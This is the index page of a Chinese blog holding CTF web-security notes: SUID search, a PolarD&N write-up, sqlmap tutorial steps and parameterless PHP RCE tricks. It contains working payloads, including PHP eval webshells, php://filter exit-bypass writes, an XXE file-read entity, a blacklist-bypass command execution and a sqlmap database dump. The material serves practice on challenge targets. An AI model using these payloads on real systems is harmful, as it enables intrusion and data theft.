<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Zbaoabo</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Zbaoabo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Zbaoabo">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="zhangsuhong">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
		</hgroup>

		
			<p class="header-subtitle"></p>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">Home</a></li>
				        
							<li><a href="/archives">Archives</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
						<!-- music -->
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">I&#39;m a developer.</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">Home</a></li>
		        
					<li><a href="/archives">Archives</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-提权" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/05/22/%E6%8F%90%E6%9D%83/" class="article-date">
  	<time datetime="2025-05-22T12:00:22.515Z" itemprop="datePublished">2025-05-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>[TOC]</p>
<h4 id="查找suid文件"><a href="#查找suid文件" class="headerlink" title="查找suid文件"></a>查找suid文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-小游戏js代码" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/05/22/%E5%B0%8F%E6%B8%B8%E6%88%8Fjs%E4%BB%A3%E7%A0%81/" class="article-date">
  	<time datetime="2025-05-22T05:16:09.071Z" itemprop="datePublished">2025-05-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="js代码"><a href="#js代码" class="headerlink" title="js代码"></a>js代码</h1><p>[TOC]</p>
<h4 id="eg1"><a href="#eg1" class="headerlink" title="eg1:"></a>eg1:</h4><p>查看js代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">game._addSuccessFn(function (scoreNow) &#123;</span><br><span class="line">    current_score.innerHTML = scoreNow</span><br><span class="line"></span><br><span class="line">    if (scoreNow === 100000000000) &#123;</span><br><span class="line">        fetch(&#x27;getflag.php&#x27;, &#123;</span><br><span class="line">            method: &#x27;POST&#x27;,</span><br><span class="line">            headers: &#123;</span><br><span class="line">                &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">            &#125;,</span><br><span class="line">            body: &#x27;score=&#x27; + scoreNow</span><br><span class="line">        &#125;)</span><br><span class="line">        .then(response =&gt; response.text())</span><br><span class="line">        .then(data =&gt; &#123;</span><br><span class="line">            alert(&quot;恭喜你！flag是：&quot; + data);</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(error =&gt; &#123;</span><br><span class="line">            console.error(&#x27;错误:&#x27;, error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>解法一：</strong></p>
<p>就想到直接在控制台修改score</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">game.score = 100000000000;</span><br></pre></td></tr></table></figure>

<p>发现不行，再去查看game.js，发现还需要触发这个回调函数</p>
<p>所以直接控制台输入，弹窗得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">game.successCallback(100000000000);</span><br></pre></td></tr></table></figure>

<p><strong>解法二：</strong></p>
<p>直接在控制台发生fetch请求，将fetch内的body修改即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;getflag.php&#x27;, &#123;</span><br><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">    &#125;,</span><br><span class="line">    body: &#x27;score=100000000000&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">.then(response =&gt; response.text())</span><br><span class="line">.then(data =&gt; alert(data))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>弹窗得到flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-XSS漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/05/19/XSS%E6%BC%8F%E6%B4%9E/" class="article-date">
  	<time datetime="2025-05-19T10:56:23.637Z" itemprop="datePublished">2025-05-19</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p>[TOC]</p>
<h4 id="eg-1"><a href="#eg-1" class="headerlink" title="eg.1"></a>eg.1</h4><p><img src="/XSS%E6%BC%8F%E6%B4%9E/image-20250519200615980.png" alt="image-20250519200615980"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?xxs=file:///etc/passwd</span><br><span class="line">?xxs=file:///flag.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-wp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/05/14/wp/" class="article-date">
  	<time datetime="2025-05-14T12:24:21.520Z" itemprop="datePublished">2025-05-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="PolarD-N-WP"><a href="#PolarD-N-WP" class="headerlink" title="PolarD&amp;N WP"></a>PolarD&amp;N WP</h1><p>[TOC]</p>
<h4 id="1-PolarD-N-session文件包含"><a href="#1-PolarD-N-session文件包含" class="headerlink" title="1.PolarD&amp;N session文件包含"></a>1.PolarD&amp;N session文件包含</h4><p><strong>parload:</strong></p>
<p>这是Load URL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f903c3a6-f3bf-4bb4-bb8c-4da0754be0fe.www.polarctf.com:8090/action.php/file=/tmp/sess_uqp4q7qfifk2i3r58j55q79ga1</span><br></pre></td></tr></table></figure>

<p><strong>POST：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=hhhh(先上传查到cookie)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最后上传一句话木马name=&lt;?=eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">再用蚁剑连接 即可得到flag</span><br></pre></td></tr></table></figure>

<p>session文件名的构造是sess_ + sessionid ， sessionid在cookie中可以查看</p>
<p>有了参数，开始猜存放session文件的位置，一般默认为tmp，直接执行命令访问session文件</p>
<p>这里可以采取两种方式得到flag：命令读取或者蚁剑连接shell</p>
<p>####2.写shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line">PolarD&amp;N CTF</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">file_put_contents($_GET[&#x27;filename&#x27;],&quot;&lt;?php exit();&quot;.$_POST[&#x27;content&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p><strong>wp:</strong></p>
<p>观察到题目使用了 <code>file_put_contents</code> 函数，这个函数是支持 php 伪协议的，所以我们可以尝试使用 <code>php://filter</code> 来对我们输入的内容进行转换。预期结果就是，我们输入的内容可以把前面的 <code>exit</code> 函数给弄得失效，并且我们写入的 php 代码可以生效。</p>
<p><strong>base64 在转换的过程中是 3:4 的比例转换的，也就是说，对于一串原始文本，每三个字符一组被转换为一串 base64 ，其长度为 4. 因此在把 base64 解码的过程中，会四个字符一组转换。另外 base64 只支持 <code>[A-Z]</code> <code>[a-z</code> <code>/</code> <code>+</code> <code>=</code> 这些字符，其余的字符都是会被当作垃圾字符直接舍弃掉。</strong></p>
<p>因此观察前面的代码 <code>&lt;?php exit();</code> ，如果我们将其认为是一段 base64 编码的话，他会被省略无关字符，变为 <code>phpexit</code> ，一共七个字符。那么如果我们转换为原始文本，为了不影响后面的 payload 的转换，按照 4:3 的转换标准，我们需要补上一个合法字符凑齐 4 的倍数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aPD9waHAgZXZhbCgkX1BPU1RbMV0pOw==   # &lt;?php eval($_POST[1]);</span><br></pre></td></tr></table></figure>

<p><strong>paylaod:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-decode/resource=1.php</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">content=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure>

<p><strong>最后，通过访问 <code>/1.php</code> ，无论是蚁剑连接，还是直接手搓 <code>POST: 1=system(&#39;cat /flag&#39;);</code> 都没问题了。</strong></p>
<h4 id="3-你的马呢"><a href="#3-你的马呢" class="headerlink" title="3.你的马呢?"></a>3.你的马呢?</h4><p><strong>双文件绕过</strong></p>
<p>其实就是上传文件 ，不过是过滤了php文件 所以我上传了一个文件为双后缀的文件 例如cmd.php.jpg，最后再用蚁剑连接</p>
<h4 id="4-反序列化"><a href="#4-反序列化" class="headerlink" title="4.反序列化"></a>4.反序列化</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">class Index&#123;</span><br><span class="line">    private $Polar1;</span><br><span class="line">    private $Polar2;</span><br><span class="line">    protected $Night;</span><br><span class="line">    protected $Light;</span><br><span class="line"></span><br><span class="line">    function getflag($flag)&#123;</span><br><span class="line">        $Polar2 = rand(0,100);</span><br><span class="line">        if($this-&gt;Polar1 === $this-&gt;Polar2)&#123;</span><br><span class="line">            $Light = rand(0,100);</span><br><span class="line">            if($this-&gt;Night === $this-&gt;Light)&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;Your wrong!!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;sys&#x27;]))&#123;</span><br><span class="line">    $a = unserialize($_GET[&#x27;sys&#x27;]);</span><br><span class="line">    $a-&gt;getflag($flag);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(&quot;index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload:</strong></p>
<p>使用变量引用来做这一道题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Index&#123;</span><br><span class="line">    public $Polar1;</span><br><span class="line">    public $Polar2;</span><br><span class="line">    public $Night;</span><br><span class="line">    public $Light;</span><br><span class="line"></span><br><span class="line">    function getflag($flag)&#123;</span><br><span class="line">        $Polar2 = rand(0,100);</span><br><span class="line">        if($this-&gt;Polar1 === $this-&gt;Polar2)&#123;</span><br><span class="line">            $Light = rand(0,100);</span><br><span class="line">            if($this-&gt;Night === $this-&gt;Light)&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;Your wrong!!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Index();</span><br><span class="line">$a-&gt;Polar1=&amp;$a-&gt;Polar2;</span><br><span class="line">$a-&gt;Night=&amp;$a-&gt;Light;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="5-你知道sys还能这样玩吗"><a href="#5-你知道sys还能这样玩吗" class="headerlink" title="5.你知道sys还能这样玩吗"></a>5.你知道sys还能这样玩吗</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    $cmd = $_POST[&#x27;cmd&#x27;];</span><br><span class="line">    if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;, $cmd)) &#123;</span><br><span class="line">        $output = system($cmd);</span><br><span class="line">        echo $output;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r &#x27;system(hex2bin(ff3b746163202f666c61672e747874));&#x27;</span><br></pre></td></tr></table></figure>

<p>扫不到敏感目录，最后猜到<code>sys.php</code></p>
<p>直接给了源码，全是过滤。可以通过两个引号绕过对命令的过滤，但是过滤了点就很难受。</p>
<p><strong>为什么前面要加ff:</strong></p>
<p>为了命令执行不受限，反弹shell。这里有一个小细节就是弹shell前的不可见字符是为了hex2bin函数能够成功执行。因为ban了引号，变量类型自动判断，如果十六进制开头是数字那么我设置的变量$a会被判断为数字，从而报错无法执行。</p>
<h4 id="6-EXX？"><a href="#6-EXX？" class="headerlink" title="6.EXX？"></a>6.EXX？</h4><p>打开网页点进去phpinfo找到一个假的flag</p>
<p>最后扫目录扫到dom.php 抓包 xml</p>
<p><strong>payload:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flagggg.php&quot; &gt;]&gt;</span><br><span class="line">    &lt;user&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/user&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">PD9waHANCi8vZmxhZ3s3ZTk3ZThjNGY5ZDZiZTM1YWU4NTAwYjlmYjJjZGQzZX0NCg==</span><br></pre></td></tr></table></figure>

<p><img src="/image-20250521190605069.png" alt="image-20250521190605069"></p>
<p>最后解码得到flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-Hg信息泄露检测利用" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/05/09/Hg%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/" class="article-date">
  	<time datetime="2025-05-09T10:57:58.510Z" itemprop="datePublished">2025-05-09</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>[toc]</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-sqlmap" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/04/25/sqlmap/" class="article-date">
  	<time datetime="2025-04-25T14:17:28.100Z" itemprop="datePublished">2025-04-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Sqlmap 使用教程</p>
<p>快速入门；SQLmap（常规）使用步骤</p>
<p>1、检测「注入点」</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘</p>
<p>1<br>2<br>2、查看所有「数据库」</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ –dbs</p>
<p>1<br>2<br>3、查看当前使用的数据库</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ –current-db</p>
<p>1<br>2<br>4、查看「数据表」</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ –tables</p>
<p>1<br>2<br>5、查看「字段」</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –tables</p>
<p>1<br>2<br>6、查看「数据」</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –dump</p>
<p>一、目标<br>检测「注入点」前，需要指定需要检测的「对象」。</p>
<p>1、指定url<br>-u 参数，指定需要检测的url，单&#x2F;双引号包裹。中间如果有提示，就输入y。</p>
<p>提示：SQLmap不能直接「扫描」网站漏洞，先用其他扫描工具扫出注入点，再用SQLmap验证并「利用」注入点。</p>
<p>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://192.168.31.180/sqli-labs-master/Less-1/?id=1">http://192.168.31.180/sqli-labs-master/Less-1/?id=1</a>‘</p>
<p>1<br>2<br>扫描完成后，告诉我们存在的注入类型和使用的数据库及版本。</p>
<p><img src="/99db1296c6f1ba11ece43312a58b9a74.png" alt="99db1296c6f1ba11ece43312a58b9a74"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-无参数RCE绕过思路" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/04/23/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/" class="article-date">
  	<time datetime="2025-04-23T12:35:23.076Z" itemprop="datePublished">2025-04-23</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="无参数RCE绕过思路"><a href="#无参数RCE绕过思路" class="headerlink" title="无参数RCE绕过思路"></a>无参数RCE绕过思路</h1><p>[TOC]</p>
<p><a target="_blank" rel="noopener" href="https://yankun8.github.io/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/">无参数RCE绕过思路 - yankun</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45785288/article/details/109259595">PHP无参数函数安全漏洞利用详解-CSDN博客</a></p>
<h3 id="方法1：getenv"><a href="#方法1：getenv" class="headerlink" title="方法1：getenv()"></a>方法1：getenv()</h3><p>查阅php手册，有非常多的超全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br><span class="line">$_REQUEST</span><br><span class="line">$_ENV</span><br></pre></td></tr></table></figure>

<p>我们可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p>
<p>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题<br>这里可以使用方法：</p>
<h4 id="array-rand"><a href="#array-rand" class="headerlink" title="array_rand()"></a>array_rand()</h4><p>array_rand() 方法用于从一个数组中随机( 伪随机 )取出一个或者多个单元 ， 并返回随机条目的一个或者多个<strong>键</strong></p>
<p>但这样只能获得数组的<strong>键</strong> ， 可以通过 array_flip() 函数获取数组的<strong>值</strong></p>
<h4 id="array-flip"><a href="#array-flip" class="headerlink" title="array_flip()"></a>array_flip()</h4><p>该函数用于交换数组中的值和键 ， 返回一个 <strong>键</strong> 与 <strong>值</strong> 相互交换后的数组</p>
<p><code>getenv()</code> , <code>array_rand()</code> , <code>array_flip()</code> 加上全局变量<code>$_ENV</code> 这三个函数配套使用 ， 可以爆破出数组中需要的内容 .</p>
<h3 id="方法2：getallheaders"><a href="#方法2：getallheaders" class="headerlink" title="方法2：getallheaders()"></a>方法2：getallheaders()</h3><h4 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><strong>getallheaders()</strong></h4><h4 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(end(getallheaders()))        //获取http请求头中最后一个参数的值，并执行</span><br></pre></td></tr></table></figure>

<p>getallheders用法小结<br>添加一个Header为c: phpinfo();,根据位置选择合适的payload：</p>
<p>添加在Header在第一个：</p>
<p>payload: code&#x3D;eval(pos(getallheaders()));</p>
<p>(pos()可以换为current(). 如果在第二个可以使用next())</p>
<p>添加在Header在最后一个：</p>
<p>payload: code&#x3D;eval(end(getallheaders()));</p>
<p>不知道位置：</p>
<p>配合array_rand(), array_flip()构造payload进行爆破：</p>
<p>payload: eval(array_rand(array_flip(getallheaders())));</p>
<h3 id="方法3：localeconv"><a href="#方法3：localeconv" class="headerlink" title="方法3：localeconv()"></a>方法3：localeconv()</h3><h4 id="scandir-："><a href="#scandir-：" class="headerlink" title="scandir()："></a><code>scandir()</code>：</h4><p><code>scandir(&#39;.&#39;)</code>能够返回当前目录的文件列表的数组，那么怎么取出文件名和读取文件呢，可以使用<code>end()</code>和<code>readfile()</code>：</p>
<p>但是还需要构造函数<code>scandir(&#39;.&#39;)</code>中的参数<code>.</code>，这里有一个<code>localeconv()</code>函数：</p>
<p>其中数组的第一个元素就是<code>.</code>， 所以用 pos 或者 current</p>
<p>但是我们不知道 flag.php的位置所以我们还需要利用我们最开始讲的两个函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

